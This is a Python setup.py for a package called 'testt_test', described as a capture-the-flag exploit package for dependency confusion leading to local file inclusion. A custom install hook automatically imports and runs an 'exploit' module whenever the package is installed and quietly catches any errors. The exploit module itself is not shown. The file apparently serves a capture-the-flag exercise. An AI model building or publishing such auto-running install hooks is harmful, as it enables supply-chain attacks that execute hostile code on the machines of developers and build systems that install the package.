from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstallCommand(install):
    """Custom install command to run exploit.py during installation."""
    def run(self):
        install.run(self)
        try:
            import exploit
            exploit.run()
        except Exception as e:
            print(f"Error running exploit script: {e}")

setup(
    name="testt_test",
    version="1.0.2",
    description="CTF exploit package for dependency confusion to LFI",
    author="Your Name",
    license="MIT",
    py_modules=["exploit"],
    install_requires=["requests>=2.25.0"],  # Ensure requests is installed
    cmdclass={
        'install': CustomInstallCommand,
    },
)